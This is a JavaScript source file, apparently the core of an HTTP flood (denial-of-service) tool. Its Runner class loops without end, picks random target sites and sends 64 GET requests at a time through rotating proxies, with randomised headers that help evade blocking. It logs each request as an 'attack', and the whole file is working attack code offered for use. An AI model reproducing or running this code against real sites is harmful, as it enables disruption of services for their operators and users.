const { EventEmitter } = require('events')
const { getRandomInt } = require('./random-utils');
const axios = require('axios-https-proxy-fix');
const { generateRequestHeaders } = require('./headers-utils');
const { getProxyObj } = require('./proxy-utils');

class Runner {
  constructor (props) {
    this.sites = props.sites
    this.proxies = props.proxies
    this.onlyProxy = props.onlyProxy
    this.eventSource = new EventEmitter()
		this.ATTACKS_PER_TARGET = 64;
		this.requestTimeout = 10000
		this.proxy = null;
  }

	async start () {
    this.active = true
    while (this.active) {
      try {
        await this.sendTroops()
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop () {
    this.active = false
  }

  setProxyActive(newProxyValue) {
    this.onlyProxy = newProxyValue
  }

	async sendTroops () {
    const target = {
      site: this.sites[getRandomInt(this.sites.length)],
      proxy: this.proxies
    };

		for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
			if (!this.active) {
        break;
      }

			try {
				await this.attack(target);
			} catch(e) {
				this.handleError(e, target);
				break;
			}
		}
	}

	async attack(target) {
		if (!this.proxy) {
			this.proxy = target.proxy[getRandomInt(target.proxy.length)]
		}
		let proxyObj = getProxyObj(this.proxy);

		const r = await axios.get(target.site.page, {
			headers: generateRequestHeaders(),
			validateStatus: () => true,
			proxy: proxyObj
		});

		this.eventSource.emit(
			'attack', 
			{ url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` },
		);

		if (r.status === 407) {
			this.proxy = null
		}
	}

	handleError(e, target) {
		this.proxy = null
		const code = e.code || 'UNKNOWN'
		if (code === 'UNKNOWN') {
			console.error(e)
		}

		this.eventSource.emit('error', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
	}
}

exports.Runner = Runner;
